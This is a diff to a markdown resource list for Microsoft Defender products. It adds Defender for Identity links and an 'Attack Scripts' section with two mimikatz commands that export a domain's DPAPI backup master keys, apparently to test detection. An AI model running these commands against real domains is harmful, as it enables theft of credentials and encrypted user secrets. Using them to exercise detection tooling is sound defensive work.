@@ -22,6 +22,16 @@ POST https://graph.microsoft.com/v1.0/security/runHuntingQuery
 ## Defender for Identity
 * Investigate and respond to attacks with Microsoft Defender for Identity [Interactive Guide](https://mslearn.cloudguides.com/guides/Investigate%20and%20respond%20to%20attacks%20with%20Microsoft%20Defender%20for%20Identity)
 * Interactive Guide [Guided Demo](https://aka.ms/MSDefenderforIdentity-IG)
+* [Sizing Tool https://aka.ms/mdi/sizingtool](https://aka.ms/mdi/sizingtool)
+* [WalkThru](https://jeffreyappel.nl/how-to-implement-defender-for-identity-and-configure-all-prerequisites/)
+* [MDI Readyness Script](https://github.com/microsoft/Microsoft-Defender-for-Identity/tree/main/Test-MdiReadiness)
+
+### Attack Scripts
+**Malicious request of Data Protection API (DPAPI) master key
+```
+mimikatz # privilege::debug
+mimikatz # lsadump::backupkeys /system:adatumt01.net /export 
+```
 
 ## Defender for Cloud Apps
 * Interactive Guide [Guided Demo](https://aka.ms/DetectThreats-ManageAlerts-MCAS_InteractiveGuide)
